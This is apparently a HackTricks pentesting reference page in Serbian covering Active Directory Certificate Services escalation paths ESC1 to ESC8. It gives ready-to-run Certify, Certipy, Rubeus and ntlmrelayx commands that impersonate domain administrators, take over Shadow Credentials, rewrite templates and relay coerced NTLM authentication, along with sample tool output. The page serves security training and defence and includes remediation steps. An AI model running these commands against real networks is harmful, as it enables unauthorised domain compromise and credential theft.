# Eskalacija domena putem AD CS-a

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz sledećih postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani certificate templates - ESC1

### Objašnjenje

### Objašnjenje pogrešno konfigurisanih certificate templates - ESC1

- **Enterprise CA dodeljuje prava za enrolment korisnicima sa niskim privilegijama.**
- **Odobrenje menadžera nije potrebno.**
- **Potpisi ovlašćenog osoblja nisu potrebni.**
- **Security descriptors na certificate templates su previše permisivni, što korisnicima sa niskim privilegijama omogućava da dobiju prava za enrolment.**
- **Certificate templates su konfigurisani tako da definišu EKU-ove koji olakšavaju autentikaciju:**
- Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili bez EKU-a (SubCA).
- **Template dozvoljava requesterima da u Certificate Signing Request (CSR) uključe subjectAltName:**
- Active Directory (AD) daje prednost vrednosti subjectAltName (SAN) u sertifikatu prilikom verifikacije identiteta, ako je prisutna. To znači da se navođenjem SAN-a u CSR-u može zatražiti sertifikat za impersonaciju bilo kog korisnika (npr. administratora domena). Da li requester može da navede SAN određuje se u AD objektu certificate template-a, preko svojstva `mspki-certificate-name-flag`. Ovo svojstvo je bitmask, a prisustvo zastavice `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućava requesteru da navede SAN.

> [!CAUTION]
> Navedena konfiguracija korisnicima sa niskim privilegijama omogućava da zatraže sertifikate sa proizvoljnim SAN-om, čime se omogućava autentikacija kao bilo koji principal domena putem Kerberos-a ili SChannel-a.

Ova funkcija je ponekad omogućena radi podrške generisanju HTTPS ili host sertifikata u hodu od strane proizvoda ili deployment servisa, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći certificate template (kao što je `WebServer` template, koji ima omogućenu opciju `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplicira, a zatim izmeni tako da uključuje authentication OID.

### Zloupotreba

Da biste **pronašli ranjive certificate templates**, možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi **zloupotrebio ovu ranjivost za impersonaciju administratora**, može se pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete konvertovati generisani **sertifikat u `.pfx`** format i ponovo ga koristiti za **autentifikaciju pomoću Rubeus ili certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi „Certreq.exe“ i „Certutil.exe“ mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija predložaka sertifikata unutar konfiguracione šeme AD Forest-a, konkretno onih za koje nije potrebno odobrenje ili potpis, koji poseduju Client Authentication ili Smart Card Logon EKU i kod kojih je omogućena zastavica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisani predlošci sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Potreba za autorizovanim potpisima je izostavljena.
4. Previše permisivan security descriptor na predlošku sertifikata dodeljuje korisnicima sa niskim privilegijama prava za enrollment sertifikata.
5. **Predložak sertifikata je definisan tako da uključuje Any Purpose EKU ili da nema EKU.**

**Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju svrhu**, uključujući client authentication, server authentication, code signing itd. Ista **technique koja se koristi za ESC3** može se primeniti za eksploataciju ovog scenarija.

Sertifikati **bez EKU-ova**, koji se ponašaju kao subordinate CA sertifikati, mogu se iskoristiti za **bilo koju svrhu** i **takođe mogu da se koriste za potpisivanje novih sertifikata**. Zbog toga napadač može da navede proizvoljne EKU-ove ili polja u novim sertifikatima koristeći subordinate CA sertifikat.

Međutim, novi sertifikati kreirani za **autentikaciju domena** neće funkcionisati ako subordinate CA nije pouzdan za objekat **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Oni bi potencijalno mogli biti **zloupotrebljeni** za širok opseg namena (npr. code signing, server authentication itd.) i mogli bi imati značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.

Za enumeraciju predložaka koji odgovaraju ovom scenariju u okviru konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani Enrollment Agent Templates - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **abusing** **drugačiji EKU** (Certificate Request Agent) i **2 različita template-a** (zbog toga ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principalu da izvrši **enroll** za **sertifikat** **u ime drugog korisnika**.

**„Enrollment agent“** izvršava **enroll** u takvom **template-u** i koristi dobijeni **sertifikat da co-sign-uje CSR u ime drugog korisnika**. Zatim **šalje** **co-sign-ovani CSR** CA-u, izvršavajući enroll u **template-u** koji **dozvoljava „enroll on behalf of“**, a CA odgovara **sertifikatom koji pripada „drugom“ korisniku**.

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Zahtev za odobrenje menadžera je izostavljen.
- Ne postoji zahtev za autorizovanim potpisima.
- Security descriptor certificate template-a je previše permisivan i dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Certificate template uključuje Certificate Request Agent EKU, omogućavajući zahtev za druge certificate templates u ime drugih principala.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Verzija schema-e template-a je ili 1 ili veća od 2, a template navodi Application Policy Issuance Requirement koji zahteva Certificate Request Agent EKU.
- EKU definisan u certificate template-u dozvoljava autentifikaciju domena.
- Ograničenja za enrollment agente nisu primenjena na CA.

### Abuse

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za abuse ovog scenarija:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Korisnici** kojima je dozvoljeno da **dobiju** **enrollment agent certificate**, templates u kojima je enrollment **agentima** dozvoljeno da vrše enrollment, kao i **accounts** u čije ime enrollment agent može da postupa, mogu biti ograničeni enterprise CA-ovima. To se postiže otvaranjem `certsrc.msc` **snap-in-a**, **desnim klikom na CA**, **klikom na Properties**, a zatim **prelaskom** na karticu „Enrollment Agents“.

Međutim, napominje se da je **podrazumevano** podešavanje za CA-ove „**Do not restrict enrollment agents**“. Kada administratori omoguće ograničavanje enrollment agenata, podešavanjem opcije „Restrict enrollment agents“, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona omogućava grupi **Everyone** da vrši enrollment u svim templatima u ime bilo koga.

## Kontrola pristupa ranjivim certificate template-ima - ESC4

### **Objašnjenje**

**Security descriptor** na **certificate template-ima** definiše **permissions** koje određeni **AD principals** poseduju u vezi sa templatе-om.

Ako **attacker** poseduje potrebne **permissions** da **izmeni** **template** i **uvede** bilo koje **exploitable misconfigurations** opisane u **prethodnim odeljcima**, privilege escalation može biti omogućen.

Značajne permissions koje se primenjuju na certificate template-e uključuju:

- **Owner:** Dodeljuje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kojih atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kojih atributa.
- **WriteOwner:** Omogućava promenu vlasnika objekta u principal-a pod kontrolom attackera.
- **WriteDacl:** Omogućava izmenu kontrola pristupa, što potencijalno može attacker-u dodeliti FullControl.
- **WriteProperty:** Omogućava izmenu bilo kojih svojstava objekta.

### Abuse

Da biste identifikovali principale sa pravima izmene nad template-ima i drugim PKI objektima, izvršite enumeraciju pomoću Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Primer privesc-a poput prethodnog:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je slučaj kada korisnik ima prava upisa nad šablonom sertifikata. Ovo se, na primer, može zloupotrebiti za prepisivanje konfiguracije šablona sertifikata, čime šablon postaje ranjiv na ESC1.

Kao što možemo videti na putanji iznad, samo `JOHNPC` ima ova prava, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` edge vezu ka `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Evo kratkog pregleda Certipy-jeve `shadow auto` komande za preuzimanje NT hash-a žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može da izmeni konfiguraciju template-a sertifikata jednom komandom. Po **podrazumevanim podešavanjima**, Certipy će **izmeniti** konfiguraciju tako da bude **ranjiva na ESC1**. Takođe možemo navesti **`-save-old` parametar da sačuvamo staru konfiguraciju**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola pristupa ranjivim PKI objektima - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata nekoliko objekata pored certificate templates i certificate authority, može uticati na bezbednost celog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD computer object CA servera, koji može biti kompromitovan mehanizmima kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji podređeni AD object ili container unutar određene putanje containera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, između ostalog, containere i objekte kao što su Certificate Templates container, Certification Authorities container, NTAuthCertificates object i Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako attacker sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**objavi CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se bavi implikacijama **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag-a, kako ih je opisao Microsoft. Ova konfiguracija, kada je aktivirana na Certification Authority (CA), dozvoljava uključivanje **vrednosti koje definiše korisnik** u **subject alternative name** za **bilo koji zahtev**, uključujući i one konstruisane iz Active Directory®. Shodno tome, ova mogućnost omogućava **intruder-u** da se upiše putem **bilo kog template-a** podešenog za domain **authentication** — konkretno, onih koji omogućavaju upis **unprivileged** korisnicima, kao što je standardni User template. Kao rezultat, moguće je dobiti certificate koji intruder-u omogućava da se autentifikuje kao domain administrator ili **bilo koji drugi aktivni entitet** unutar domain-a.

**Napomena**: Način dodavanja **alternative names** u Certificate Signing Request (CSR), putem argumenta `-attrib "SAN:"` u `certreq.exe` (koji se naziva „Name Value Pairs“), razlikuje se od strategije eksploatacije SAN-ova u ESC1. Razlika je u tome **kako su informacije o nalogu enkapsulirane** — unutar certificate attribute-a, a ne extension-a.

### Zloupotreba

Da bi proverile da li je podešavanje aktivirano, organizacije mogu koristiti sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **remote registry access**, stoga bi alternativni pristup mogao biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i da je eksploatišu:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Za izmenu ovih podešavanja, pod pretpostavkom da posedujete **administratorska prava nad domenom** ili ekvivalentna prava, sledeća komanda može da se izvrši sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, flag se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022. godine, novoizdati **sertifikati** sadržaće **bezbednosno proširenje** koje uključuje svojstvo `objectSid` **podnosioca zahteva**. Kod ESC1, ovaj SID se izvodi iz navedenog SAN-a. Međutim, kod **ESC6**, SID odražava `objectSid` **podnosioca zahteva**, a ne SAN.\
> Za iskorišćavanje ESC6 neophodno je da sistem bude ranjiv na ESC10 (slaba mapiranja sertifikata), koji daje prednost **SAN-u u odnosu na novo bezbednosno proširenje**.

## Kontrola pristupa ranjivoj Certificate Authority - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa za Certificate Authority održava se pomoću skupa dozvola koje upravljaju radnjama CA-a. Ove dozvole možete pregledati tako što ćete pristupiti aplikaciji `certsrv.msc`, kliknuti desnim tasterom miša na CA, izabrati svojstva, a zatim otvoriti karticu Security. Pored toga, dozvole se mogu nabrojati pomoću modula PSPKI, koristeći komande kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvid u primarna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „CA administrator“ i „Certificate Manager“.

#### Abuse

Posedovanje prava **`ManageCA`** nad sertifikacionim autoritetom omogućava principalu da daljinski menja podešavanja koristeći PSPKI. To uključuje uključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, čime se omogućava navođenje SAN-a u bilo kom template-u, što je ključan aspekt domain escalation-a.

Ovaj proces se može pojednostaviti korišćenjem cmdlet-a **Enable-PolicyModuleFlag** iz PSPKI-ja, koji omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje zahteva na čekanju, čime se efektivno zaobilazi zaštita „CA certificate manager approval“.

Kombinacija modula **Certify** i **PSPKI** može se koristiti za slanje zahteva, odobravanje i preuzimanje sertifikata:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** iskorišćene su dozvole **`Manage CA`** za **omogućavanje** zastavice **EDITF_ATTRIBUTESUBJECTALTNAME2**, kako bi se izveo **ESC6 napad**, ali ovo neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa `Manage CA`, korisniku je takođe dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može udaljeno da restartuje servis**. Pored toga, E**SC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zato je ovde predstavljen drugi napad.

Preduslovi:

- Samo dozvola **`ManageCA`**
- Dozvola **`Manage Certificates`** (može se dodeliti iz **`ManageCA`**)
- Certificate template **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se zasniva na činjenici da korisnici sa pravima pristupa `Manage CA` _i_ `Manage Certificates` mogu da **izdaju neuspešne zahteve za sertifikate**. Certificate template **`SubCA`** je **ranjiv na ESC1**, ali samo **administratori** mogu da se upišu u template. Dakle, **korisnik** može da **zatraži** upis u **`SubCA`** - što će biti **odbijeno** - ali ga zatim menadžer može izdati.

#### Zloupotreba

Možete sebi **dodeliti pravo pristupa `Manage Certificates`** tako što ćete dodati svog korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template može biti **omogućen na CA** pomoću parametra `-enable-template`. Podrazumevano, **`SubCA`** template je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi **zahtevom za sertifikat zasnovan na šablonu `SubCA`**.

**Ovaj zahtev će biti odbije**n, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim **`Manage CA` i `Manage Certificates`**, zatim možemo **izdati neuspeli zahtev za sertifikat** pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I konačno, možemo **preuzeti izdat sertifikat** pomoću komande `req` i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse ekstenzije Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje zahteva na čekanju), **Certify 2.0** je otkrio potpuno novu primitivu koja zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.

RPC metoda `ICertAdmin::SetExtension` može da se izvrši sa bilo kojim principalom koji poseduje *Manage Certificates*. Iako su legitimni CA-ovi tradicionalno koristili ovu metodu za ažuriranje ekstenzija na zahtevima koji su **na čekanju**, napadač može da je zloupotrebi kako bi **dodao *non-default* certificate extension** (na primer prilagođeni *Certificate Issuance Policy* OID kao što je `1.1.1.1`) zahtevu koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA NEĆE prepisati vrednost koju kontroliše napadač kada zahtev konačno bude izdat. Rezultujući sertifikat zato sadrži ekstenziju koju je izabrao napadač, a ona može da:

* Ispuni zahteve Application / Issuance Policy za druge ranjive template-e (što dovodi do privilege escalation).
* Ubaci dodatne EKU-ove ili policy-je koji sertifikatu daju neočekivano poverenje u third-party sistemima.

Ukratko, *Manage Certificates* – koji se ranije smatrao „manje moćnom“ polovinom ESC7 – sada može da se iskoristi za potpunu privilege escalation ili dugoročnu persistence, bez menjanja CA konfiguracije i bez potrebe za restriktivnijom pravom *Manage CA*.

#### Zloupotreba primitive pomoću Certify 2.0

1. **Pošaljite certificate request koji će ostati *pending*.**  Ovo se može prinudno postići pomoću template-a koji zahteva odobrenje manager-a:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Zabeležite vraćeni Request ID
```

2. **Dodajte prilagođenu ekstenziju zahtevu na čekanju** pomoću nove `manage-ca` komande:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # lažni issuance-policy OID
```
*Ako template već ne definiše ekstenziju *Certificate Issuance Policies*, navedena vrednost će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe ima prava za odobravanje *Manage Certificates*) ili sačekajte da ga operator odobri.  Kada bude izdat, preuzmite sertifikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Rezultujući sertifikat sada sadrži zlonamerni issuance-policy OID i može se koristiti u narednim napadima (npr. ESC13, domain escalation itd.).

> NAPOMENA:  Isti napad može da se izvrši pomoću Certipy ≥ 4.7 kroz komandu `ca` i parametar `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je instaliran **AD CS**, ako postoji **web enrollment endpoint vulnerable** i ako je objavljen najmanje jedan **certificate template** koji dozvoljava domain computer enrollment i client authentication (kao što je podrazumevani **`Machine`** template), **napadač može da kompromituje bilo koji računar na kojem je aktivna spooler service**!

AD CS podržava nekoliko metoda enrollment-a zasnovanih na **HTTP-u**, koje su dostupne kroz dodatne server roles koje administratori mogu da instaliraju. Ovi interfejsi za HTTP-based certificate enrollment podložni su **NTLM relay napadima**. Napadač sa **kompromitovanog računara može da se impersonate-uje kao bilo koji AD account koji se autentifikuje putem inbound NTLM-a**. Tokom impersonation-a victim account-a, napadač može da pristupi ovim web interfejsima i zatraži client authentication certificate koristeći `User` ili `Machine` certificate templates.

- **Web enrollment interface** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, koji ne pruža zaštitu od NTLM relay napada. Pored toga, eksplicitno dozvoljava samo NTLM authentication kroz svoj Authorization HTTP header, zbog čega sigurnije metode authentication-a, poput Kerberos-a, nisu primenljive.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate authentication kroz svoj Authorization HTTP header. Negotiate authentication podržava i Kerberos i **NTLM**, što napadaču omogućava da tokom relay napada **spusti authentication na NTLM**. Iako ovi web services podrazumevano omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita od NTLM relay napada za HTTPS services moguća je samo kada se HTTPS kombinuje sa channel binding-om. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je potrebno za channel binding.

Uobičajen **problem** kod NTLM relay napada jeste **kratko trajanje NTLM sessions** i nemogućnost napadača da komunicira sa services-ima koji **zahtevaju NTLM signing**.

Ipak, ovo ograničenje se prevazilazi iskorišćavanjem NTLM relay napada za dobijanje sertifikata za user-a, jer period validnosti sertifikata određuje trajanje session-a, a sertifikat se može koristiti sa services-ima koji **zahtevaju NTLM signing**. Uputstva za korišćenje ukradenog sertifikata dostupna su na:


{{#ref}}
account-persistence.md
{{#endref}}

Drugo ograničenje NTLM relay napada jeste to što **victim account mora da se authenticate-uje na računar koji kontroliše napadač**. Napadač može ili da čeka ili da pokuša da **iznudi** ovu authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumeriše **omogućene HTTP AD CS endpoint-e**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CA) za čuvanje Certificate Enrollment Service (CES) endpoints. Ovi endpoints mogu se parsirati i izlistati korišćenjem alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba pomoću [Certipy](https://github.com/ly4k/Certipy)

Certipy podrazumevano šalje zahtev za sertifikat na osnovu template-a `Machine` ili `User`, što se određuje prema tome da li se naziv naloga koji se prosleđuje završava znakom `$`. Navođenje alternativnog template-a moguće je pomoću parametra `-template`.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) zatim može da se koristi za primoravanje autentikacije. Kada se radi sa domain controllerima, neophodno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

